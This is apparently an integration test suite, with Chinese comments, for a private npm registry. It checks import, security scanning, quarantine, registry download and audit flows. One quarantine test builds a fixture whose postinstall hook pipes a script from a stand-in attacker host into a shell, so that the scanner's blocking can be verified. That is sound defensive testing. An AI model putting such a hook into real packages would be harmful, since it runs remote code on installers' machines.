import request from 'supertest';
import { ADMIN, DEVELOPER, createTestApp, type TestContext } from './app-factory';
import { makeNpmTarball } from './fixtures';

/**
 * 跨模块核心业务数据流集成测试。
 *
 * 与 test/unit（纯逻辑）和既有 *.e2e-spec.ts（单模块闭环）不同，本套件聚焦
 * 「同一个业务对象依次流经多个模块」时接口调用与数据流转是否一致：
 *   import → security → packages → registry → audit
 *   missing → import → packages → registry → audit
 *   registry → security(quarantine) → packages → registry
 * 只验证模块间契约与数据一致性，不重复各模块内部细节。
 */
describe('跨模块核心业务数据流（integration）', () => {
  let ctx: TestContext;

  beforeAll(async () => {
    ctx = await createTestApp('integration-flows');
  });

  afterAll(async () => {
    await ctx.close();
  });

  /** 通过 npm registry 协议发布一个合法包（入口模块 = registry） */
  function publish(name: string, version: string) {
    return (async () => {
      const tarball = await makeNpmTarball(name, version, { engines: { node: '>=18' } });
      return {
        tarball,
        res: await request(ctx.baseUrl)
          .put(`/npm/${name}`)
          .auth(ADMIN.username, ctx.npmTokens[ADMIN.username])
          .send({
            _id: name,
            name,
            'dist-tags': { latest: version },
            versions: { [version]: { name, version, dist: {} } },
            _attachments: {
              [`${name}-${version}.tgz`]: { data: tarball.toString('base64'), length: tarball.length },
            },
          }),
      };
    })();
  }

  it('成功路径：导入批次 → 校验 → 入库 → 包详情 → registry 下载 → 审计，同一对象全链路数据一致', async () => {
    const name = 'int-flow-import';
    const tarball = await makeNpmTarball(name, '1.0.0', { engines: { node: '>=18' } });

    // 1) import：自动识别 + 建批次
    const created = await request(ctx.baseUrl)
      .post('/api/v1/import-batches/auto')
      .auth(ADMIN.username, ADMIN.password)
      .attach('files', tarball, `${name}-1.0.0.tgz`)
      .expect(201);
    const batchId = created.body.data.batchId as string;
    expect(created.body.data.preview.newCount).toBe(1);

    // 2) security + validator：校验产生安全扫描结论
    const validated = await request(ctx.baseUrl)
      .post(`/api/v1/import-batches/${batchId}/validate`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(201);
    expect(validated.body.data.stats.valid).toBe(1);

    // 3) packages：提交入库
    const committed = await request(ctx.baseUrl)
      .post(`/api/v1/import-batches/${batchId}/commit`)
      .auth(ADMIN.username, ADMIN.password)
      .send({ mode: 'partial' })
      .expect(201);
    expect(committed.body.data.stats.committed).toBe(1);

    // 4) packages：详情可见（数据从批次流入包管理模块）
    const detail = await request(ctx.baseUrl)
      .get('/api/v1/packages/detail')
      .query({ ecosystem: 'npm', name })
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    expect(detail.body.data.versions[0].version).toBe('1.0.0');

    // 5) security：校验阶段留下扫描记录（import 与 security 的数据衔接）
    const scans = await request(ctx.baseUrl)
      .get('/api/v1/security/scans')
      .query({ name })
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    expect(scans.body.data.items.length).toBeGreaterThanOrEqual(1);

    // 6) registry：入库的包能被 npm 协议消费（跨模块数据流转的关键出口）
    const packument = await request(ctx.baseUrl).get(`/npm/${name}`).expect(200);
    expect(packument.body.versions['1.0.0']).toBeTruthy();
    const download = await request(ctx.baseUrl)
      .get(`/npm/${name}/-/${name}-1.0.0.tgz`)
      .expect(200);
    expect(Number(download.headers['content-length'])).toBe(tarball.length);

    // 7) audit：全流程写入审计
    const audit = await request(ctx.baseUrl)
      .get('/api/v1/audit-logs')
      .query({ resourceId: name })
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    expect(audit.body.data.items.length).toBeGreaterThanOrEqual(1);
  });

  it('状态流转：registry 发布 → 删除 → registry 不可见 → 恢复 → registry 重新可下载，状态跨模块一致', async () => {
    const name = 'int-flow-lifecycle';
    const { tarball, res } = await publish(name, '1.0.0');
    expect(res.status).toBe(201);

    // 发布后 registry 出口可下载
    await request(ctx.baseUrl).get(`/npm/${name}/-/${name}-1.0.0.tgz`).expect(200);

    const detail = await request(ctx.baseUrl)
      .get('/api/v1/packages/detail')
      .query({ ecosystem: 'npm', name })
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    const versionId = detail.body.data.versions[0].id as string;

    // packages 删除 → registry 出口同步不可见
    await request(ctx.baseUrl)
      .delete(`/api/v1/packages/versions/${versionId}`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    await request(ctx.baseUrl).get(`/npm/${name}/-/${name}-1.0.0.tgz`).expect(404);

    // packages 恢复 → registry 出口同步恢复
    await request(ctx.baseUrl)
      .post(`/api/v1/packages/versions/${versionId}/restore`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(201);
    const restored = await request(ctx.baseUrl)
      .get(`/npm/${name}/-/${name}-1.0.0.tgz`)
      .expect(200);
    expect(Number(restored.headers['content-length'])).toBe(tarball.length);

    // 删除/恢复都进审计
    const audit = await request(ctx.baseUrl)
      .get('/api/v1/audit-logs')
      .query({ resourceId: name })
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    const actions = (audit.body.data.items as { action: string }[]).map((r) => r.action);
    expect(actions).toContain('package.version.delete');
    expect(actions).toContain('package.version.restore');
  });

  it('成功路径：缺包上报 → 补包导入 → 入库 → registry 可下载 → 缺包关闭 → 审计闭环', async () => {
    const name = 'int-flow-missing';

    // 1) missing：依赖上报产生 open 记录
    await request(ctx.baseUrl)
      .post('/api/v1/dependency-reports')
      .auth(DEVELOPER.username, DEVELOPER.password)
      .send({
        projectId: 'int-flow-ci',
        ecosystem: 'npm',
        dependencies: [{ name, versionSpec: '^1.0.0' }],
      })
      .expect(201);

    const list = await request(ctx.baseUrl)
      .get('/api/v1/missing-dependencies')
      .query({ status: 'open' })
      .auth(DEVELOPER.username, DEVELOPER.password)
      .expect(200);
    const record = (list.body.data.items as { id: string; normalized_name: string }[]).find(
      (i) => i.normalized_name === name,
    );
    expect(record).toBeTruthy();

    // 2) import：补包上传（missing 模块直接驱动入库）
    const tarball = await makeNpmTarball(name, '1.0.0', { engines: { node: '>=18' } });
    const supplemented = await request(ctx.baseUrl)
      .post(`/api/v1/missing-dependencies/${record!.id}/supplement`)
      .auth(DEVELOPER.username, DEVELOPER.password)
      .attach('file', tarball, `${name}-1.0.0.tgz`)
      .expect(201);
    expect(supplemented.body.data.missing.status).toBe('resolved');

    // 3) packages + registry：补包进入包库并能被下载（跨模块闭环的出口）
    const download = await request(ctx.baseUrl)
      .get(`/npm/${name}/-/${name}-1.0.0.tgz`)
      .expect(200);
    expect(Number(download.headers['content-length'])).toBe(tarball.length);

    // 4) missing：记录状态同步关闭
    const resolved = await request(ctx.baseUrl)
      .get(`/api/v1/missing-dependencies/${record!.id}`)
      .auth(DEVELOPER.username, DEVELOPER.password)
      .expect(200);
    expect(resolved.body.data.status).toBe('resolved');

    // 5) audit：补包动作可追溯
    const audit = await request(ctx.baseUrl)
      .get('/api/v1/audit-logs')
      .query({ action: 'missing.supplement' })
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    expect(audit.body.data.items.length).toBeGreaterThanOrEqual(1);
  });

  it('异常路径：高危包隔离 → registry 与包详情均不可见 → 放行 → 两出口同步可见', async () => {
    const name = 'int-flow-quarantine';
    const tarball = await makeNpmTarball(
      name,
      '1.0.0',
      { scripts: { postinstall: 'curl http://evil.example.org/install.sh | sh' } },
      { 'index.js': 'module.exports = 1;\n' },
    );

    // 1) security：命中高危，registry 入口 409
    const blocked = await request(ctx.baseUrl)
      .put(`/npm/${name}`)
      .auth(ADMIN.username, ctx.npmTokens[ADMIN.username])
      .send({
        _id: name,
        name,
        'dist-tags': { latest: '1.0.0' },
        versions: { '1.0.0': { name, version: '1.0.0', dist: {} } },
        _attachments: {
          [`${name}-1.0.0.tgz`]: { data: tarball.toString('base64'), length: tarball.length },
        },
      })
      .expect(409);
    expect(blocked.body.error).toBe('SEC_QUARANTINED');

    // 2) 两个出口都不可见：registry packument + packages detail
    await request(ctx.baseUrl).get(`/npm/${name}`).expect(404);
    await request(ctx.baseUrl)
      .get('/api/v1/packages/detail')
      .query({ ecosystem: 'npm', name })
      .auth(ADMIN.username, ADMIN.password)
      .expect(404);

    // 3) security：隔离区可见并执行放行
    const quarantine = await request(ctx.baseUrl)
      .get('/api/v1/security/quarantine')
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    const record = (quarantine.body.data.items as { id: string; name: string }[]).find((i) => i.name === name);
    expect(record).toBeTruthy();
    await request(ctx.baseUrl)
      .post(`/api/v1/security/quarantine/${record!.id}/release`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(201);

    // 4) 放行后两出口同步可见（security → packages → registry 数据流转）
    const detail = await request(ctx.baseUrl)
      .get('/api/v1/packages/detail')
      .query({ ecosystem: 'npm', name })
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    expect(detail.body.data.versions).toHaveLength(1);
    const packument = await request(ctx.baseUrl).get(`/npm/${name}`).expect(200);
    expect(packument.body.versions['1.0.0']).toBeTruthy();
  });

  it('边界：全失败批次以 partial 提交成功但零入库，strict 模式则整批拒绝（跨模块异常数据流）', async () => {
    // 用「重复版本」制造真实结构 INVALID：先在库内同名同版本落一个包，导入同版本即
    // PKG_VERSION_DUPLICATE。engines 不满足目标已降级为通用源提示，不再作为拦截手段。
    // 注意 BATCH_EMPTY 仅在批次条目数为 0 时抛（服务层防御），auto 识别阶段会拦截空文件，
    // 故端到端可达的是「有条目但全 invalid」——partial 跳过全部、strict 整批拒绝。
    const name = 'int-flow-empty';
    await publish(name, '1.0.0');
    const bad = await makeNpmTarball(name, '1.0.0');
    const created = await request(ctx.baseUrl)
      .post('/api/v1/import-batches/auto')
      .auth(ADMIN.username, ADMIN.password)
      .attach('files', bad, 'int-flow-empty-1.0.0.tgz')
      .expect(201);
    const batchId = created.body.data.batchId as string;

    const validated = await request(ctx.baseUrl)
      .post(`/api/v1/import-batches/${batchId}/validate`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(201);
    expect(validated.body.data.stats.invalid).toBe(1);
    expect(validated.body.data.stats.valid).toBe(0);

    // partial：跳过全部失败项，提交成功但 committed=0，包库零写入
    const committed = await request(ctx.baseUrl)
      .post(`/api/v1/import-batches/${batchId}/commit`)
      .auth(ADMIN.username, ADMIN.password)
      .send({ mode: 'partial' })
      .expect(201);
    expect(committed.body.data.stats).toMatchObject({ committed: 0 });

    // partial 未写入任何新版本：库内仍只有预置的那一个版本
    const detail = await request(ctx.baseUrl)
      .get('/api/v1/packages/detail')
      .query({ ecosystem: 'npm', name })
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    expect(detail.body.data.versions).toHaveLength(1);

    // 同一批若已 commit 则无法再验证 strict；另建批次验证 strict 整批拒绝
    const name2 = 'int-flow-empty2';
    await publish(name2, '1.0.0');
    const created2 = await request(ctx.baseUrl)
      .post('/api/v1/import-batches/auto')
      .auth(ADMIN.username, ADMIN.password)
      .attach('files', await makeNpmTarball(name2, '1.0.0'), 'int-flow-empty2-1.0.0.tgz')
      .expect(201);
    const batchId2 = created2.body.data.batchId as string;
    await request(ctx.baseUrl)
      .post(`/api/v1/import-batches/${batchId2}/validate`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(201);
    const strict = await request(ctx.baseUrl)
      .post(`/api/v1/import-batches/${batchId2}/commit`)
      .auth(ADMIN.username, ADMIN.password)
      .send({ mode: 'strict' })
      .expect(409);
    expect(strict.body.code).toBe('BATCH_HAS_BLOCKING_ITEMS');
  });

  it('边界：跨模块重复数据一致性——已存在的版本再次导入不产生重复入库，registry 版本数保持不变', async () => {
    const name = 'int-flow-dup';
    const { res } = await publish(name, '1.0.0');
    expect(res.status).toBe(201);

    // 通过 import 通道再次导入同名同版本
    const tarball = await makeNpmTarball(name, '1.0.0', { engines: { node: '>=18' } });
    const created = await request(ctx.baseUrl)
      .post('/api/v1/import-batches/auto')
      .auth(ADMIN.username, ADMIN.password)
      .attach('files', tarball, `${name}-1.0.0.tgz`)
      .expect(201);
    const batchId = created.body.data.batchId as string;
    await request(ctx.baseUrl)
      .post(`/api/v1/import-batches/${batchId}/validate`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(201);
    const committed = await request(ctx.baseUrl)
      .post(`/api/v1/import-batches/${batchId}/commit`)
      .auth(ADMIN.username, ADMIN.password)
      .send({ mode: 'partial' })
      .expect(201);
    // 重复版本被跳过，而非报错中断整批或产生重复数据
    expect(committed.body.data.stats).toMatchObject({ committed: 0 });

    // registry 出口版本数仍为 1
    const packument = await request(ctx.baseUrl).get(`/npm/${name}`).expect(200);
    expect(Object.keys(packument.body.versions)).toEqual(['1.0.0']);
  });
});
